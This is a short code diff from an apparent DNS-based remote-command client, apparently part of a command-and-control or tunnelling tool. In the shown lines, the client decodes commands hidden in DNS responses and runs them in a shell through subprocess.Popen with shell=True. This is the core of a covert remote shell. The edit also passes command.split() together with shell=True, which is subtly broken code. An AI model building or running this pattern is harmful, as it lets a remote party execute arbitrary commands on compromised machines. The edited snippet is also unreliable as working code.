@@ -503,8 +503,8 @@ class DNSClient:
             if len(results) > 0:
                 command = self.cmdDecode(results)
                 # print(results)
-                print(command)
-                out = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+                # print(command)
+                out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                 (stdout, stderr) = out.communicate()
             self.socket.close()
         elif not recursion_desired:
